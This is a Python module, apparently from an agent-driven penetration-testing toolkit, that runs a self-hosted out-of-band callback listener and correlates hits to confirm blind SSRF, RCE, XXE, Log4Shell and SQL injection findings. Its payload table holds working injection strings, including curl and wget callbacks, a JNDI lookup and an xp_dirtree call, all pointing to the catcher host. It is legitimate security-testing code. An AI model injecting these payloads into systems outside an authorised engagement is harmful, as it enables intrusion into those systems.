# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Aaron K. Clark
"""Self-hosted OAST / out-of-band callback catcher (issue #17).

For blind vulnerabilities (blind SSRF, blind RCE, Log4Shell, OOB XXE), the
target reaches *back* to a host the operator controls. This module is a
pure-Python, **self-hosted** HTTP catcher — there is no third-party
collaborator (no oast.fun etc.), and it is **off by default**: nothing
listens until ``oast_start`` is called.

Flow:
  1. ``oast_start`` binds a local HTTP listener.
  2. ``oast_register(vuln_class)`` mints a unique correlation token, renders
     payloads from the ``{OAST}`` template library, and persists a
     ``pending_oob`` finding in the engagement.
  3. The agent injects a payload into the target.
  4. ``oast_poll`` returns captured interactions and, for any whose path or
     Host carries a pending token, **materializes an ``oob_confirmed``
     finding** — turning a blind guess into evidence.

Each registration and each correlated hit is audited. The catcher's secret
key is redacted in the audit log. Captured interactions are kept in-process
(not written to disk), so plaintext callbacks don't linger in a file.

The socket server lives behind the module-level ``_serve`` factory so the
test suite exercises registration/correlation without binding a real port.
"""

from __future__ import annotations

import secrets
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

from . import audit, engagement

# {OAST} -> full callback URL (base/token); {OAST_HOST} -> token.host (for
# DNS/JNDI-style payloads). Keyed by vuln class.
_PAYLOADS: dict[str, list[str]] = {
    "ssrf": ["{OAST}", "{OAST}/ssrf"],
    "rce": ["curl {OAST}/rce", "wget -qO- {OAST}/rce", "nslookup {OAST_HOST}"],
    "xxe": ['<!DOCTYPE r [<!ENTITY x SYSTEM "{OAST}/xxe">]><r>&x;</r>'],
    "log4shell": ["${jndi:ldap://{OAST_HOST}/a}", "${jndi:dns://{OAST_HOST}/a}"],
    "sqli_oob": ["'; exec master..xp_dirtree '//{OAST_HOST}/a'--"],
    "generic": ["{OAST}"],
}


def _now() -> str:
    from datetime import UTC, datetime
    return datetime.now(UTC).isoformat(timespec="seconds")


def _make_interaction(
    method: str, path: str, headers: dict[str, str], source_ip: str, body: str
) -> dict[str, Any]:
    return {
        "ts": _now(),
        "method": method,
        "path": path,
        "host": headers.get("Host", ""),
        "user_agent": headers.get("User-Agent", ""),
        "source_ip": source_ip,
        "body": body[:2048],
    }


class _Catcher:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.base_url = f"http://{host}:{port}"
        self.key = secrets.token_hex(16)
        self.interactions: list[dict[str, Any]] = []
        self.pending: dict[str, dict[str, Any]] = {}
        self.confirmed: set[str] = set()
        self._lock = threading.Lock()
        self._server: Any = None

    def record(self, interaction: dict[str, Any]) -> None:
        with self._lock:
            self.interactions.append(interaction)

    def add_pending(self, token: str, rec: dict[str, Any]) -> None:
        with self._lock:
            self.pending[token] = rec

    def snapshot(self) -> tuple[list[dict[str, Any]], dict[str, dict[str, Any]]]:
        with self._lock:
            return list(self.interactions), dict(self.pending)


_active: _Catcher | None = None


def _handler_factory(catcher: _Catcher) -> type[BaseHTTPRequestHandler]:
    class _H(BaseHTTPRequestHandler):
        def _capture(self, method: str) -> None:
            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            catcher.record(_make_interaction(
                method, self.path, dict(self.headers), self.client_address[0], body,
            ))
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

        def do_GET(self) -> None:  # noqa: N802
            self._capture("GET")

        def do_POST(self) -> None:  # noqa: N802
            self._capture("POST")

        def log_message(self, *_: Any) -> None:
            pass

    return _H


def _serve(host: str, port: int, catcher: _Catcher) -> Any:
    """Start the HTTP listener in a daemon thread. Patched out in tests."""
    server = ThreadingHTTPServer((host, port), _handler_factory(catcher))
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


async def oast_start(host: str = "127.0.0.1", port: int = 8000) -> dict[str, Any]:
    """Start the self-hosted OOB catcher (off by default until called)."""
    global _active
    if _active is not None:
        return {"ok": False, "error": "already_running", "base_url": _active.base_url}
    if not (1 <= int(port) <= 65535):
        return {"ok": False, "error": "invalid_port", "port": port}
    catcher = _Catcher(host, int(port))
    try:
        catcher._server = _serve(host, int(port), catcher)
    except OSError as exc:
        return {"ok": False, "error": "listen_failed", "message": str(exc)}
    _active = catcher
    # The secret key is redacted in the audit log.
    audit.log("oast_start", host=host, port=int(port), key=audit._hash8(catcher.key))
    return {
        "ok": True, "base_url": catcher.base_url, "host": host, "port": int(port),
        "note": "self-hosted; ensure this host is reachable from the target.",
    }


def oast_register(vuln_class: str = "generic") -> dict[str, Any]:
    """Mint a correlation token + payloads for a vuln class; persist pending."""
    if _active is None:
        return {"ok": False, "error": "not_running"}
    cls = (vuln_class or "generic").strip().lower()
    templates = _PAYLOADS.get(cls)
    if not templates:
        return {"ok": False, "error": "unknown_vuln_class", "known": sorted(_PAYLOADS)}
    token = secrets.token_hex(8)
    oast_host = f"{token}.{_active.host}"
    callback = f"{_active.base_url}/{token}"
    payloads = [t.replace("{OAST}", callback).replace("{OAST_HOST}", oast_host)
                for t in templates]
    rec = {"token": token, "vuln_class": cls, "payloads": payloads, "registered_at": _now()}
    _active.add_pending(token, rec)
    try:
        engagement.record_finding(
            "pending_oob", token, {"vuln_class": cls, "callback": callback},
            source_tool="oast",
        )
    except Exception:
        pass
    audit.log("oast_register", token=token, vuln_class=cls)
    return {"ok": True, "correlation_token": token, "vuln_class": cls,
            "callback": callback, "payloads": payloads}


def _matches(interaction: dict[str, Any], token: str) -> bool:
    return token in interaction.get("path", "") or token in interaction.get("host", "")


def oast_poll() -> dict[str, Any]:
    """Return captured interactions; materialize findings for correlated hits."""
    if _active is None:
        return {"ok": False, "error": "not_running"}
    interactions, pending = _active.snapshot()
    hits: list[dict[str, Any]] = []
    for token, rec in pending.items():
        if token in _active.confirmed:
            continue
        match = next((i for i in interactions if _matches(i, token)), None)
        if not match:
            continue
        _active.confirmed.add(token)
        with _active._lock:
            _active.pending.pop(token, None)
        try:
            engagement.record_finding(
                "oob_confirmed", match.get("source_ip", token),
                {"vuln_class": rec["vuln_class"], "token": token,
                 "method": match.get("method"), "path": match.get("path"),
                 "source_ip": match.get("source_ip")},
                source_tool="oast",
            )
        except Exception:
            pass
        audit.log("oast_hit", token=token, vuln_class=rec["vuln_class"],
                  source_ip=match.get("source_ip", ""))
        hits.append({"token": token, "vuln_class": rec["vuln_class"], "interaction": match})

    with _active._lock:
        remaining_pending = len(_active.pending)
    return {
        "ok": True,
        "interactions": interactions,
        "hits": hits,
        "pending": remaining_pending,
        "confirmed": len(_active.confirmed),
    }


async def oast_stop() -> dict[str, Any]:
    """Stop the catcher and discard in-process interactions."""
    global _active
    if _active is None:
        return {"ok": False, "error": "not_running"}
    server = _active._server
    if server is not None:
        try:
            server.shutdown()
            server.server_close()
        except Exception:
            pass
    audit.log("oast_stop", confirmed=len(_active.confirmed))
    _active = None
    return {"ok": True, "stopped": True}


def reset_for_test() -> None:
    global _active
    _active = None
